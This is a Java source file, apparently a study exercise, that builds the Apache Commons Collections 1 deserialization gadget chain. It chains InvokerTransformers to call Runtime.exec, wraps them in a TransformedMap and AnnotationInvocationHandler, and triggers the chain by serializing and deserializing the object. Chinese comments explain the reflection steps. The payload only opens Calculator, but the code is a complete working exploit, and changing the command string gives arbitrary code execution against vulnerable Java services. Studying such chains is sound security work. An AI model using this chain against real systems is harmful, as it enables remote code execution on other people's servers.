package com.rain;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.lang.annotation.Target;


public class CC1 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{ Object.class,Object[].class},new Object[]{null,null }),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open -a Calculator.app"}),
        };
        ChainedTransformer chainedTransformer =new ChainedTransformer(transformers);

        HashMap map = new HashMap();
        map.put("value","value");   //设置map的值
        Map transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

        // 这里去查找类，并动态地创建了一个对象（和 C++ 的 new 类似）
        Class c =Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor =  c.getDeclaredConstructor(Class.class,Map.class);
        // 设置对象属性访问权限
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class,transformedMap);    // 返回一个对象引用

        // 序列化与反序列化
        Utils.serialize(o);
        Utils.deserialize();

    }

}